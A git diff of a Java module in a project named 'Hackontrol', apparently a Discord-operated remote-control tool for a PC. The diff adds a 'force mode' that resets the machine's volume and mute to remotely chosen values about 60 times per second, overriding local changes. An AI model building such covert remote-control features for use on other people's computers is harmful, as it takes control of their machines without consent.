@@ -1,5 +1,8 @@
 package com.khopan.hackontrol.module;
 
+import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
+
 import com.khopan.hackontrol.NativeLibrary;
 import com.khopan.hackontrol.manager.interaction.ButtonContext;
 import com.khopan.hackontrol.manager.interaction.ButtonManager;
@@ -25,9 +28,16 @@ public class AudioModule extends Module {
 	private static final Button BUTTON_MUTE          = ButtonManager.staticButton(ButtonType.SUCCESS, "Mute", "muteMaster");
 	private static final Button BUTTON_UNMUTE        = ButtonManager.staticButton(ButtonType.DANGER, "Unmute", "unmuteMaster");
 
-	private static final Button BUTTON_CHANGE_VOLUME = ButtonManager.staticButton(ButtonType.SUCCESS, "Change Volume", "changeVolume");
+	private static final Button BUTTON_CHANGE_VOLUME = ButtonManager.staticButton(ButtonType.SUCCESS, "Change Volume", "changeVolumeMaster");
+
+	private static final Button BUTTON_ENABLE_FORCE  = ButtonManager.staticButton(ButtonType.SUCCESS, "Enable", "enableForceModeMaster");
+	private static final Button BUTTON_DISABLE_FORCE = ButtonManager.staticButton(ButtonType.DANGER, "Disable", "disableForceModeMaster");
 
 	private static final String MODAL_CHANGE_VOLUME = "changeVolume";
+
+	private volatile float volume;
+	private volatile boolean mute;
+	private volatile boolean forceMode;
 
 	@Override
 	public String getName() {
@@ -39,31 +49,66 @@ public class AudioModule extends Module {
 		registry.register(InteractionManager.BUTTON_REGISTRY, AudioModule.BUTTON_MUTE,          context -> this.buttonMute(context, true));
 		registry.register(InteractionManager.BUTTON_REGISTRY, AudioModule.BUTTON_UNMUTE,        context -> this.buttonMute(context, false));
 		registry.register(InteractionManager.BUTTON_REGISTRY, AudioModule.BUTTON_CHANGE_VOLUME, this :: buttonChangeVolume);
+		registry.register(InteractionManager.BUTTON_REGISTRY, AudioModule.BUTTON_ENABLE_FORCE,  context -> this.buttonForceMode(context, true));
+		registry.register(InteractionManager.BUTTON_REGISTRY, AudioModule.BUTTON_DISABLE_FORCE, context -> this.buttonForceMode(context, false));
 		registry.register(InteractionManager.MODAL_REGISTRY,  AudioModule.MODAL_CHANGE_VOLUME,  this :: modalChangeVolume);
 	}
 
 	@Override
 	public void initialize() {
 		this.channel.sendMessageComponents(ActionRow.of(AudioModule.BUTTON_MUTE, AudioModule.BUTTON_UNMUTE), ActionRow.of(AudioModule.BUTTON_CHANGE_VOLUME)).queue();
+		this.channel.sendMessage("**Force Mode**").addActionRow(AudioModule.BUTTON_ENABLE_FORCE, AudioModule.BUTTON_DISABLE_FORCE).queue();
+	}
+
+	@Override
+	public void postInitialize() {
+		Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(this :: tick, 0, 1000 / 60, TimeUnit.MILLISECONDS);
+	}
+
+	private void tick() {
+		if(!this.forceMode) {
+			return;
+		}
+
+		if(NativeLibrary.volume() != this.volume) {
+			NativeLibrary.volume(this.volume);
+		}
+
+		if(NativeLibrary.mute() != this.mute) {
+			NativeLibrary.mute(this.mute);
+		}
 	}
 
 	private void buttonMute(ButtonContext context, boolean mute) {
-		if(NativeLibrary.mute() == mute) {
+		if((this.forceMode ? this.mute : NativeLibrary.mute()) == mute) {
 			HackontrolMessage.boldDeletable(context.reply(), "Master volume is already " + (mute ? "muted" : "unmuted"));
 			return;
 		}
 
 		if(!mute) {
-			Question.positive(context.reply(), "Are you sure you want to unmute?", QuestionType.YES_NO, () -> NativeLibrary.mute(false));
+			Question.positive(context.reply(), "Are you sure you want to unmute?", QuestionType.YES_NO, () -> {
+				if(this.forceMode) {
+					this.mute = false;
+				} else {
+					NativeLibrary.mute(false);
+				}
+			});
+
 			return;
 		}
 
-		NativeLibrary.mute(true);
+		if(this.forceMode) {
+			this.mute = true;
+		} else {
+			NativeLibrary.mute(true);
+		}
+
 		context.deferEdit().queue();
 	}
 
 	private void buttonChangeVolume(ButtonContext context) {
-		String volumeLevel = Integer.toString(Math.min(Math.max((int) Math.round(((double) NativeLibrary.volume()) * 100.0d), 0), 100));
+		float volume = this.forceMode ? this.volume : NativeLibrary.volume();
+		String volumeLevel = Integer.toString(Math.min(Math.max((int) Math.round(((double) volume) * 100.0d), 0), 100));
 		TextInput textInput = TextInput.create("volume", "Volume", TextInputStyle.SHORT)
 				.setRequired(true)
 				.setMinLength(1)
@@ -77,6 +122,23 @@ public class AudioModule extends Module {
 				.build();
 
 		context.replyModal(modal).queue();
+	}
+
+	private void buttonForceMode(ButtonContext context, boolean enable) {
+		if(this.forceMode == enable) {
+			HackontrolMessage.boldDeletable(context.reply(), "Force mode is already " + (enable ? "enabled" : "disabled"));
+			return;
+		}
+
+		if(!enable) {
+			Question.positive(context.reply(), "Are you sure you want to disable force mode?", QuestionType.YES_NO, () -> this.forceMode = false);
+			return;
+		}
+
+		this.volume = NativeLibrary.volume();
+		this.mute = NativeLibrary.mute();
+		this.forceMode = true;
+		context.deferEdit().queue();
 	}
 
 	private void modalChangeVolume(ModalContext context) {
@@ -103,7 +165,13 @@ public class AudioModule extends Module {
 		}
 
 		float volume = ((float) volumeLevel) / 100.0f;
-		NativeLibrary.volume(volume);
+
+		if(this.forceMode) {
+			this.volume = volume;
+		} else {
+			NativeLibrary.volume(volume);
+		}
+
 		context.deferEdit().queue();
 	}
 }
